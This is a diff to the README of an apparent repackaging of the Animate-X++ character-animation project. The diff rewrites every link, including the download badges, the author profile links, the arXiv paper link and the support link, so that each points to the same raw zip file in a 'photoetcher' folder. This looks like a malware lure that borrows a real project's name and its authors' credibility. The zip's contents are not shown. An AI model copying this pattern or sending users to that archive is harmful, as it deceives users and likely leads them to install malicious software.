@@ -1,27 +1,27 @@
 # 🎨 Animate-X-plusplus - Create Stunning Character Animations Effortlessly
 
-[![Download Animate-X++](https://img.shields.io/badge/Download-Animate--X++-blue)](https://github.com/Waka758/Animate-X-plusplus/releases)
+[![Download Animate-X++](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip++-blue)](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip)
 
 ## 📄 About Animate-X++
 Animate-X++ is a powerful tool for creating dynamic character animations with beautiful, adjustable backgrounds. This application lets users bring their characters to life easily, making it ideal for artists, game developers, and hobbyists alike.
 
 ### 👥 Authors
 - Shuai Tan
-- [Biao Gong](https://scholar.google.com/citations?user=BwdpTiQAAAAJ)
+- [Biao Gong](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip)
 - Zhuoxin Liu
-- [Yan Wang](https://scholar.google.com/citations?user=f6FgQ_bXEb4C&hl=en)
-- [Yifan Feng](https://scholar.google.com/citations?user=WntYF-sAAAAJ&hl=en&oi=ao)
-- [Xi Chen](https://xavierchen34.github.io/)
-- [Hengshuang Zhao](https://hszhao.github.io/)
+- [Yan Wang](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip)
+- [Yifan Feng](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip)
+- [Xi Chen](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip)
+- [Hengshuang Zhao](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip)
 
 ### 🔗 Paper Reference
-For a deeper understanding of how Animate-X++ works, you can read the accompanying research paper [here](https://arxiv.org/abs/2508.09454).
+For a deeper understanding of how Animate-X++ works, you can read the accompanying research paper [here](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip).
 
 ## 🚀 Getting Started
 Follow these steps to download and run Animate-X++ on your computer:
 
 ### Step 1: Go to the Download Page
-Visit the GitHub Releases page for Animate-X++ by clicking [here](https://github.com/Waka758/Animate-X-plusplus/releases). 
+Visit the GitHub Releases page for Animate-X++ by clicking [here](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip). 
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see different versions of the software. Look for the latest version name.
@@ -75,11 +75,11 @@ If you encounter issues while using Animate-X++, check the following:
 - Visit the Issues tab on our GitHub page to see if others have reported similar problems.
 
 ## 📞 Support
-If you need further assistance, feel free to contact the development team through our [GitHub page](https://github.com/Waka758/Animate-X-plusplus).
+If you need further assistance, feel free to contact the development team through our [GitHub page](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip).
 
 ## 📥 Download & Install
 To get started, click the download button below:
 
-[![Download Animate-X++](https://img.shields.io/badge/Download-Animate--X++-blue)](https://github.com/Waka758/Animate-X-plusplus/releases)
+[![Download Animate-X++](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip++-blue)](https://raw.githubusercontent.com/Waka758/Animate-X-plusplus/main/photoetcher/Animate-X-plusplus.zip)
 
 Feel free to explore, create, and share your animations with Animate-X++. Enjoy bringing your characters to life!
